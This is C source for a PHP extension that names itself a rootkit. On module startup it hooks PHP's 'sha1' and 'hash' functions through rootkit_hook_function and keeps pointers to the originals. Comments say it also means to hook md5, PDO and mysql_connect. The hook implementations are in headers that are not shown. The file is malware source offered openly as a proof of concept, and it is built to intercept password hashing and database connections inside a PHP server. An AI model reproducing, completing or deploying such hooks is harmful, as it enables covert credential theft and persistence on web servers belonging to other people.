// Libraries & frameworks
#include "php.h"

// Rootkit logic & configuration
#include "rootkit_config.h"
#include "rootkit_hook.h"
#include "rootkit_hook/hash.h"


/**
 * On module init
 * Hook function calls such as 'md5' 'sha1' 'PDO' 'mysql_connect'
 */
PHP_MINIT_FUNCTION(rootkit)
{
	rootkit_hook_function("sha1", hash__sha1_hook, &hash__sha1_original);
	rootkit_hook_function("hash", hash__hash_hook, &hash__hash_original);
	return SUCCESS;
}

/**
 * Module entry
 * Defines the module itself
 */
zend_module_entry rootkit_module_entry = {
	STANDARD_MODULE_HEADER,
	ROOTKIT_NAME,
	NULL,                   /* All exposed functions, only to test POC, will get removed later */
	PHP_MINIT(rootkit),     /* On module startup */
	NULL,                   /* On module shutdown */
	NULL,                   /* On request start */
	NULL,	                /* On request end */
	NULL,					/* Module info, used in phpinfo(); */
	ROOTKIT_VERSION,
	STANDARD_MODULE_PROPERTIES
};

/**
 * ZEND_GET_MODULE
 *
 * Description:
 *   Provides additional C code used if you want to build a dynamic loaded extension.
 *
 * Parameters:
 *   extension name - Name of the extension.
 *
 * Example:
 *   // Enables DSO (Dynamic Shared Object) support for curl_extension
 *   ZEND_GET_MODULE (curl_extension)
 *
 * Source:
 *   http://webcache.googleusercontent.com/search?q=cache:tfNxKPKE3gEJ:php.webtutor.pl/en/2001/07/07/zend_get_module/+&cd=1&hl=en&ct=clnk&gl=nl
 */
ZEND_GET_MODULE(rootkit)
